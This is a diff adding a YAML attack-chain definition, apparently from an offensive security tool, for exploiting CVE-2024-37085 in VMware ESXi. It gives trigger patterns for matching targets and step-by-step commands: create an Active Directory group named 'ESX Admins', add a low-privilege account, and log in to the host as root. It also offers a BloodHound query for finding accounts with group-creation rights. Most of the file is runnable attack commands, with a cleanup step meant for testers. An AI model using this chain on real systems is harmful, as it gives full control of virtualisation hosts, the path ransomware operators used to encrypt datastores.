@@ -1,0 +1,79 @@
+chain_id: esxi_cve_2024_37085_ad_esx_admins
+title: "VMware ESXi — CVE-2024-37085 'ESX Admins' AD group → full host admin"
+severity: CRITICAL
+tags: [esxi, vmware, ad, cve-2024-37085, ransomware, akira, blackbasta, post-exploit]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-37085" }
+    - { product_pattern: "(?i)vmware.*esxi" }
+    - { banner_pattern: "(?i)esxi" }
+    - { port_in: [443, 902], service_pattern: "(?i)esxi|vmware" }
+
+description: |
+  ESXi 7.0 / 8.0 joined to Active Directory grants full
+  administrative rights on the host to any member of an AD group
+  literally named "ESX Admins" — and re-creates the group's
+  membership match on every refresh. If you have permission to
+  create AD groups (e.g. a default "Account Operators" member, or
+  any user with delegated `CreateChild` on a target OU), you
+  create the group, add yourself, and own every joined ESXi.
+  Akira and Black Basta abused this from at least Q1 2024 to
+  encrypt VM datastores wholesale before Microsoft disclosed it.
+
+steps:
+  - id: 1
+    title: "Confirm the ESXi is AD-joined"
+    command: |
+      # From the ESXi shell (read-only is fine):
+      esxcli system permission list | grep -i 'esx admins\\|domain'
+      # Or from the AD side, look for the host's computer account in the
+      # OU you have rights on:
+      Get-ADComputer -Filter * -SearchBase 'OU=ESXi,DC=corp,DC=local'
+
+  - id: 2
+    title: "From a foothold with group-creation rights, create the group"
+    command: |
+      # impacket-net group on Linux:
+      net rpc group add 'ESX Admins' -U 'CORP/lowpriv%P@ssw0rd!' \
+        -S dc01.corp.local
+      # Or PowerShell on a Windows foothold:
+      New-ADGroup -Name 'ESX Admins' -GroupScope Global -Path 'CN=Users,DC=corp,DC=local'
+
+  - id: 3
+    title: "Add yourself"
+    command: |
+      net rpc group addmem 'ESX Admins' 'lowpriv' \
+        -U 'CORP/lowpriv%P@ssw0rd!' -S dc01.corp.local
+      # PowerShell:
+      Add-ADGroupMember -Identity 'ESX Admins' -Members lowpriv
+
+  - id: 4
+    title: "SSH or vSphere into the ESXi as your AD user — now root"
+    command: |
+      ssh CORP\\\\lowpriv@$ESXI_HOST
+      # Inside:
+      esxcli system version get
+      vim-cmd vmsvc/getallvms
+
+  - id: 5
+    title: "Cleanup — leave forensics minimal if you are testing only"
+    command: |
+      Remove-ADGroupMember -Identity 'ESX Admins' -Members lowpriv -Confirm:$false
+      Remove-ADGroup -Identity 'ESX Admins' -Confirm:$false
+
+common_errors:
+  - error: "ESXi rejects domain credentials"
+    solution: |
+      Host is not joined to AD, or the AD trust is broken. Check
+      `esxcli system domain list` from the host. CVE only applies
+      when the host is actively joined.
+  - error: "you do not have group-creation rights in the target OU"
+    solution: |
+      Pivot through `Account Operators`, `Server Operators`, or any
+      account with delegated `CreateChild` on `OU=Users` /
+      `OU=Groups`. BloodHound `MATCH p=allShortestPaths((u {owned:true})-[*1..]->(o:OU)) WHERE ANY(r IN relationships(p) WHERE type(r) IN ['GenericAll','CreateChild','WriteOwner'])` finds the path.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-37085
+  - https://www.microsoft.com/en-us/security/blog/2024/07/29/ransomware-operators-exploit-esxi-hypervisor-vulnerability-for-mass-encryption/
